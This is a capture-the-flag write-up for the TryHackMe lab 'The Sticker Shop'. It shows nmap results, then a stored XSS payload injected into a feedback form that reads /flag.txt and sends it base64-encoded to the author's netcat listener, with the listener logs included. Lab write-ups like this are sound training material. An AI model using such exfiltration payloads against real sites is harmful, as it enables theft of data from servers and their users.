---
title: The Sticker Shop
description: Writeup for the TryHackMe machine The Stocker Shop
date: 2024-11-29
categories: [TryHackMe]
tags: [try-hack-me,thm,xss]
---

## Recon

### nmap

`nmap` finds two open ports: SHH (22) and HTTP (8080).
```
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA)
|   256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA)
|_  256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519)
8080/tcp open  http-proxy Werkzeug/3.0.1 Python/3.8.10
|_http-title: Cat Sticker Shop
|_http-server-header: Werkzeug/3.0.1 Python/3.8.10
```

### HTTP - TCP 8080

The website hosts a cat sticker shop. Attempting to access `/flag.txt` returns a `401 Unauthorized` error. There is a feedback submission form available at `/submit_feedback`.

## Reading the Flag

I test the `/submit_feedback` endpoint for XSS vulnerabilities by submitting the following payload:
```html
<script>fetch("http://10.x.x.x:9001/xss")</script>
```
Upon execution, I receive the following response:
```console
$ nc -nvlp 9001 
listening on [any] 9001 ...
connect to [10.9.1.78] from (UNKNOWN) [10.10.249.123] 37708
GET /xss HTTP/1.1
Host: 10.9.1.78:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.6045.105 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:8080
Referer: http://127.0.0.1:8080/
Accept-Encoding: gzip, deflate
```
Next, I craft a payload to read the flag file and exfiltrate its contents to my machine:
```html
<script>
fetch("http://127.0.0.1:8080/flag.txt")
	.then(response => response.text())
	.then(body => fetch("http://10.x.x.x:9001/"+btoa(body)))
</script>
```
When executed, this payload successfully retrieved the flag:
```console
$ nc -nvlp 9001 
listening on [any] 9001 ...
connect to [10.9.1.78] from (UNKNOWN) [10.10.249.123] 53152
GET /<REDACTED> HTTP/1.1
Host: 10.9.1.78:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.6045.105 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:8080
Referer: http://127.0.0.1:8080/
Accept-Encoding: gzip, deflate
```
